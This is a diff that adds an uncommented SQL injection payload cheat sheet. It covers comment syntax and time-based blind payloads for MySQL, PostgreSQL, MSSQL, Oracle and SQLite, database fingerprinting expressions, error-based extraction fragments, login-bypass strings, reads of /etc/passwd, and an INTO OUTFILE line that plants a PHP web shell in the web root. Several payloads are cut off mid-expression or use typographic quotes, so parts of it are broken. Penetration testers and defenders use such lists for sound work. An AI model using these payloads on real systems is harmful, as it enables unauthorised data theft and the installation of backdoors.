@@ -1,0 +1,97 @@
+MySQL
+#comment
+-- comment     [Note the space after the double dash]
+/*comment*/
+/*! MYSQL Special SQL */
+
+PostgreSQL
+--comment
+/*comment*/
+
+MSQL
+--comment
+/*comment*/
+
+Oracle
+--comment
+
+SQLite
+--comment
+/*comment*/
+--
+MySQL (string concat and logical ops)
+1' + sleep(10)
+1' and sleep(10)
+1' && sleep(10)
+1' | sleep(10)
+
+PostgreSQL (only support string concat)
+1' || pg_sleep(10)
+
+MSQL
+1' WAITFOR DELAY '0:0:10'
+
+Oracle
+1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
+1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)
+
+SQLite
+1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
+1' AND 123=LIKE('
+
+["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
+["connection_id()=connection_id()"                 ,"MYSQL"],
+["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
+["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
+["@@CONNECTIONS>0"                                 ,"MSSQL"],
+["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
+["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
+["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
+["ROWNUM=ROWNUM"                                   ,"ORACLE"],
+["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
+["LNNVL(0=123)"                                    ,"ORACLE"],
+["5::int=5"                                        ,"POSTGRESQL"],
+["5::integer=5"                                    ,"POSTGRESQL"],
+["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
+["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
+["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
+["current_database()=current_database()"           ,"POSTGRESQL"],
+["sqlite_version()=sqlite_version()"               ,"SQLITE"],
+["last_insert_rowid()>1"                           ,"SQLITE"],
+["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
+["val(cvar(1))=1"                                  ,"MSACCESS"],
+["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
+["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
+["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
+["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
+
+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2)
+id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
+AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-
+select load_file(concat('\\\\',version(),
+a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
+Oracle:        BITAND(1,1)
+MySQL:         POW(1,1)
+SQL Server:     SQUARE(1,1)
+admin’    #
+admin”    #
+admin’))    #
+‘ or 1=1    --+
+‘ or 1=1    #
+" or "        " "
+" or true    --
+" or true    --+
+‘)) or true    -- -
+admin'  or 1=1 or ''='
+admin') or ('1'='1'--
+admin') or '1'='1'/*
+admin") or "1"="1
+') or ('1'='1    --
+select count(*), concat(0x3a,
+‘ AND (select 1 from (select count(*),
+'  AND 1>2                --+
+'  AND 1=1               --+
+select load_file(“/etc/passwd”)
+select load_file(“/etc/passwd”) into outfile “/tmp/file.txt”
+UNION SELECT “<?php system($_GET[‘cmd’]); ?>” into outfile “../var/www/html/phpBackdoor.php”
+UNION SELECT 0xPHP_PAYLOAD_IN_HEX
